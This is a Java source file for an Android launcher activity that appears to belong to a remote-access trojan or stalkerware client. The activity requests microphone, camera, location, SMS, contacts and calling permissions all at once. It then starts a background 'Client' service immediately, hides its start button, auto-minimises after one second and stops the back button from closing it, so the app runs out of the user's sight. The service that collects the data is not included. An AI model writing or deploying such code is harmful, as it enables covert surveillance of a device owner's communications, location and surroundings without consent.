package my.app.client;

import android.app.Activity;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;
import androidx.core.app.ActivityCompat;
import android.Manifest;

public class LauncherActivity extends Activity {
    
    Button btnStart, btnStop;
    private boolean isServiceRunning = false;
    
    private static final int PERMISSION_REQUEST_CODE = 100;
    private static final String[] PERMISSIONS = {
        Manifest.permission.INTERNET,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.CAMERA,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.READ_SMS,
        Manifest.permission.SEND_SMS,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.WRITE_EXTERNAL_STORAGE,
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.VIBRATE,
        Manifest.permission.CALL_PHONE
    };

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);

        // Request all permissions at once
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            requestPermissions(PERMISSIONS, PERMISSION_REQUEST_CODE);
        }
        
        setupUI();
        
        // Start service immediately
        startClientService();
    }

    private void setupUI() {
        btnStart = (Button) findViewById(R.id.buttonstart);
        btnStop = (Button) findViewById(R.id.buttonstop);

        btnStart.setOnClickListener(new View.OnClickListener() {
            public void onClick(View view) {
                if (!isServiceRunning) {
                    startClientService();
                }
            }
        });

        btnStop.setOnClickListener(new View.OnClickListener() {
            public void onClick(View view) {
                stopClientService();
            }
        });
        
        // Hide START button initially
        btnStart.setVisibility(View.GONE);
    }

    private void startClientService() {
        try {
            Intent clientIntent = new Intent(this, Client.class);
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(clientIntent);
            } else {
                startService(clientIntent);
            }
            
            isServiceRunning = true;
            btnStart.setEnabled(false);
            btnStop.setEnabled(true);
            Toast.makeText(this, "Service started", Toast.LENGTH_SHORT).show();
            
            // Auto-minimize app after 1 second
            new Thread(new Runnable() {
                @Override
                public void run() {
                    try {
                        Thread.sleep(1000);
                        runOnUiThread(new Runnable() {
                            @Override
                            public void run() {
                                moveTaskToBack(true);
                            }
                        });
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }).start();
        } catch (Exception e) {
            Toast.makeText(this, "Error starting service", Toast.LENGTH_SHORT).show();
        }
    }

    private void stopClientService() {
        try {
            Intent clientIntent = new Intent(this, Client.class);
            stopService(clientIntent);
            
            isServiceRunning = false;
            btnStart.setEnabled(true);
            btnStop.setEnabled(false);
            Toast.makeText(this, "Service stopped", Toast.LENGTH_SHORT).show();
        } catch (Exception e) {
            Toast.makeText(this, "Error stopping service", Toast.LENGTH_SHORT).show();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            // Permissions granted
        }
    }
    
    @Override
    public void onBackPressed() {
        // Don't close app, just move to background
        moveTaskToBack(true);
    }
}
